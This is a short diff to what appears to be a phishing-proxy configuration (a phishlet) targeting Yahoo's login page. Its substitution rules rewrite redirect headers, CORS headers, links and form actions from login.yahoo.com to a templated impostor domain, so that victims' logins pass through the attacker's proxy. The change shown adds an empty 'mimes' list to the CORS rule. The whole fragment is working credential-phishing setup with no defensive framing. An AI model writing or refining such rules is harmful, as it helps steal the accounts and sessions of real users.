@@ -23,7 +23,7 @@ sub_filters:
   
   # Redirects, CORS, and Form Handling
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'application/json'], headers: ['Location', 'Refresh']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', mimes: [], headers: ['Access-Control-Allow-Origin']}
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '"/', replace: '"https://{{.Endpoint1}}.{{.Domain}}/', mimes: ['text/html', 'application/javascript']}
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'action="https://login.yahoo.com', replace: 'action="https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html']}
 
